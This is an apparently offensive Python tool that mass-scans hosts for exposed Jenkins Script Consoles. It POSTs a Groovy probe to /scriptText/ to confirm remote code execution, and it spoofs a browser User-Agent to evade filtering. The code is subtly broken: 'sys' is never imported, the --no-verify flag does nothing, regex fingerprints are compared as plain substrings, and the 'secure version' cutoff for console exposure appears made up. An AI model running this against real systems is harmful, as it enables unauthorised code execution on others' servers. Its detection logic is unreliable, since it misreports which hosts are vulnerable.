#!/usr/bin/env python3
"""
Jenkins Script Console Remote Code Execution (RCE) Scanner
===========================================================
Detects and exploits unauthenticated access to Jenkins's Script Console, which can lead 
to Remote Code Execution (RCE) vulnerabilities in improperly secured Jenkins instances.

Vulnerability Details:
  - Jenkins provides a powerful Groovy-based script console for administrators to manage and 
    automate tasks.
  - If access to the console is not properly restricted, attackers can execute arbitrary 
    commands on the underlying operating system.
  - This vulnerability could result from misconfigured role-based access controls (RBAC), 
    weak default setup, or bypass techniques in specific deployments of Jenkins.
  - Often seen in improperly secured CI/CD pipelines.

Risk:
  - CVSS v3.1 Base Score: Critical (9.8) - High Confidentiality, Integrity, and Availability impact.
  - An attacker can fully compromise the host if vulnerable.

Usage:
  # Scan a single target for vulnerable Jenkins instances
  python jenkins_script_console_rce_scanner.py --target http://jenkins.example.com

  # Check for detection only, no RCE testing
  python jenkins_script_console_rce_scanner.py --target http://jenkins.example.com --safe

  # Bulk scan targets from a file
  python jenkins_script_console_rce_scanner.py --list targets.txt --output results.json

  # Increase concurrency for large scans and bypass certificate validation
  python jenkins_script_console_rce_scanner.py --list targets.txt --concurrency 50 --no-verify

References:
  - https://www.jenkins.io/doc/book/security/script-console/
  - https://owasp.org/www-project-jenkins/
"""

import asyncio
import json
import httpx
from httpx import HTTPStatusError, TimeoutException
import argparse
import re
from datetime import datetime, timezone
from typing import Optional

# ── ANSI Color Helpers ───────────────────────────────────────────────────────

RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

def c(color: str, text: str) -> str:
    """Format console text with ANSI color codes."""
    return f"{color}{text}{RESET}"

# ── Constants ─────────────────────────────────────────────────────────────────

TOOL_NAME = "jenkins_script_console_rce_scanner"
CVE_ID = "MULTI"
CVSS = "9.8"
REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 30

# Paths indicating the presence of unsecured Jenkins Script Console
DETECTION_PATHS = [
    "/scriptText/",
    "/script"
]

# Patterns for Jenkins footprint and console detection
JENKINS_FINGERPRINTS = [
    r'Jenkins',
    r'classpath: jenkins',
    r'Jenkins [\d.]+',
    r'X-Jenkins: ([\d.]+)',
]

# Version extraction patterns from X-Jenkins headers or HTML
VERSION_PATTERNS = [
    r'X-Jenkins: ([0-9.]+)',
    r'Jenkins [^\"]+ ([0-9.]+)',
]

# Secure Jenkins version where the script console vulnerability was addressed in most cases
MINIMUM_SECURE_VERSION = (2, 277, 0)

# Sample Groovy script for limited active probing
RCE_PROBE_SCRIPT = "print('Hello, Jenkins!')"

# Headers to mimic a real browser visit and avoid early filtering
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}


# ── Helper Functions ─────────────────────────────────────────────────────────

async def fetch_url(client: httpx.AsyncClient, url: str) -> Optional[httpx.Response]:
    """Fetch a URL with error handling."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT, headers=HEADERS)
        response.raise_for_status()
        return response
    except (HTTPStatusError, TimeoutException):
        return None


async def detect_jenkins(client: httpx.AsyncClient, target: str) -> bool:
    """Detect Jenkins presence using fingerprinting."""
    for path in DETECTION_PATHS:
        url = f"{target.rstrip('/')}{path}"
        response = await fetch_url(client, url)
        if response and any(fingerprint in response.text for fingerprint in JENKINS_FINGERPRINTS):
            return True
    return False


def extract_version(headers: httpx.Headers) -> Optional[tuple]:
    """Extract Jenkins version from HTTP headers."""
    for pattern in VERSION_PATTERNS:
        match = re.search(pattern, " ".join(headers.values()))
        if match:
            version_parts = match.group(1).split(".")
            return tuple(map(int, version_parts))
    return None


def is_vulnerable(version: Optional[tuple]) -> bool:
    """Determine if the detected Jenkins version is vulnerable."""
    if not version:
        return False
    return version < MINIMUM_SECURE_VERSION


async def attempt_rce(client: httpx.AsyncClient, target: str) -> bool:
    """Attempt to execute code via Jenkins Script Console."""
    url = f"{target.rstrip('/')}/scriptText/"
    try:
        response = await client.post(url, data={"script": RCE_PROBE_SCRIPT}, timeout=REQUEST_TIMEOUT)
        if response and "Hello, Jenkins!" in response.text:
            return True
    except Exception:
        return False
    return False


async def scan_target(semaphore: asyncio.Semaphore, target: str, safe: bool) -> dict:
    """Scan a single Jenkins target for vulnerability."""
    result = {
        "target": target,
        "vulnerable": False,
        "version": None,
        "rce_success": None,
        "error": None,
    }

    async with semaphore:
        async with httpx.AsyncClient(verify=False, timeout=REQUEST_TIMEOUT) as client:
            try:
                print(c(CYAN, f"[INFO] Scanning {target}..."))
                if not await detect_jenkins(client, target):
                    print(c(GREEN, f"[INFO] No Jenkins instance detected at {target}. Skipping."))
                    return result

                print(c(YELLOW, f"[INFO] Detected Jenkins at {target}. Extracting version."))
                response = await fetch_url(client, target)
                version = extract_version(response.headers) if response else None
                result["version"] = ".".join(map(str, version)) if version else "unknown"

                if not version:
                    print(c(YELLOW, f"[INFO] Unable to determine Jenkins version for {target}."))
                elif is_vulnerable(version):
                    result["vulnerable"] = True
                    print(c(RED, f"[CRITICAL] {target} is running a vulnerable Jenkins version {result['version']}."))
                    
                    if not safe:
                        print(c(YELLOW, "[INFO] Attempting RCE on vulnerable Jenkins Script Console..."))
                        result["rce_success"] = await attempt_rce(client, target)
                        if result["rce_success"]:
                            print(c(RED, f"[CRITICAL] RCE SUCCESSFUL on {target}."))

                else:
                    print(c(GREEN, f"[INFO] Jenkins at {target} is running a secure version {result['version']}."))
            except Exception as e:
                result["error"] = str(e)
                print(c(RED, f"[ERROR] Failed to scan {target}: {e}"))
    return result


async def scan_targets(targets: list, safe: bool, concurrency: int) -> list:
    """Scan multiple Jenkins targets asynchronously."""
    semaphore = asyncio.Semaphore(concurrency)
    tasks = [scan_target(semaphore, target, safe) for target in targets]
    return await asyncio.gather(*tasks)


def parse_targets(target: Optional[str], target_list_path: Optional[str]) -> list:
    """Parse targets from command-line argument or a file."""
    targets = []
    if target:
        targets.append(target)
    if target_list_path:
        with open(target_list_path, "r") as f:
            targets.extend(line.strip() for line in f if line.strip())
    return list(set(targets))


# ── Main Function ────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(description="Scan Jenkins servers for potentially exploitable script console access.")
    parser.add_argument("--target", help="Target Jenkins server URL (e.g. http://localhost:8080/).")
    parser.add_argument("--list", help="File with a list of Jenkins server URLs to scan.")
    parser.add_argument("--output", help="File to save JSON results.")
    parser.add_argument("--safe", action="store_true", help="Detection-only mode (no RCE proof-of-concept attempts).")
    parser.add_argument("--concurrency", type=int, default=10, help="Concurrency level for scanning (default: 10).")
    parser.add_argument("--no-verify", action="store_true", help="Disable TLS certificate verification.")

    args = parser.parse_args()

    # Read and process target list
    targets = parse_targets(args.target, args.list)
    if not targets:
        print(c(RED, "[ERROR] No targets specified. Use --target or --list."))
        sys.exit(1)

    # Run scans asynchronously
    results = asyncio.run(scan_targets(
        targets, 
        safe=args.safe, 
        concurrency=args.concurrency,
    ))

    # Save results to file if requested
    if args.output:
        with open(args.output, "w") as outfile:
            json.dump(results, outfile, indent=2)

    # Display summary
    print(c(BOLD, "\nScan Results:"))
    for result in results:
        if result["vulnerable"]:
            status = c(RED, "VULNERABLE")
        else:
            status = c(GREEN, "SAFE")
        print(f"{status} - {result['target']} (Version: {result['version']})")


if __name__ == "__main__":
    main()
